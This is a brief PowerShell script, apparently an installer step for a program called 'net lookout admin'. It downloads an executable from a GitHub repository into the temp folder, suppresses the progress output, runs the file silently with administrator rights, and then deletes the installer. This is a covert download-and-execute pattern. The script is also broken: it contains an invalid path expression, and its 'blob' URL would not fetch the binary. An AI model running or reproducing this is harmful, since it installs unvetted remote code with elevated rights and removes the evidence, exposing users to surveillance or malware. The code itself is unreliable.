<# 1. download and install net lookout admin#>
$Path = $env:TEMP -WorkingDirectory; $Installer = "network.exe"; $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest "https://github.com/StudyWithMe9x/NetworkSoftware/blob/main/Setup_x64.exe" -OutFile $Path\$Installer; Start-Process -FilePath $Path\$Installer -Args "/y /silent /install" -Verb RunAs -Wait; Remove-Item $Path\$Installer 
